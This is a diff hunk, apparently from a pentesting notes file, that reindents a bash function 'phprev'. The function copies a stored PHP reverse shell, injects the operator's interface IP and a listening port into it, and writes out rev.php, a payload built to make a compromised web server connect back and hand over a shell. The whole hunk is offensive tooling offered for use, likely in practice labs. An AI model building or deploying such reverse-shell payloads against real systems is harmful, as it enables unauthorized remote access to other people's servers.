@@ -28,19 +28,20 @@ Usage: `phprev <Interface> <Optional: Listening Port>`
 # Defaults to port 443 if port is not specified
 
 function phprev() {
-phprevshelldir=/root/Try-Harder/Scripts/Shells/php-reverse-shell.php #CHANGE THIS
-if [ $# -eq 0 ]; then echo "Please define interface"
-else
-    revip=`ifconfig $1 | head -n2 | tail -n1 | awk '{print $2}' `
-    cp $phprevshelldir ./rev.php && sed -i 's/ipaddress/'$revip'/g' rev.php
-        if [ $# -eq 2 ]; then
-        revport=$2 ;
-        sed -i 's/443/'$2'/g' rev.php
-        else revport=443
+        phprevshelldir=/root/Try-Harder/Scripts/Shells/php-reverse-shell.php #CHANGE THIS
+        if [ $# -eq 0 ]; then echo "Please define interface"
+        else
+            revip=`ifconfig $1 | head -n2 | tail -n1 | awk '{print $2}' `
+            cp $phprevshelldir ./rev.php && sed -i 's/ipaddress/'$revip'/g' rev.php
+                if [ $# -eq 2 ]; then
+                revport=$2 ;
+                sed -i 's/443/'$2'/g' rev.php
+                else revport=443
+                fi
+            echo "PHP reverse shell(rev.php) created and configured to connect back to:" $revip:$revport
         fi
-    echo "PHP reverse shell(rev.php) created and configured to connect back to:" $revip:$revport
-fi
 }
+
 
 
 ~~~
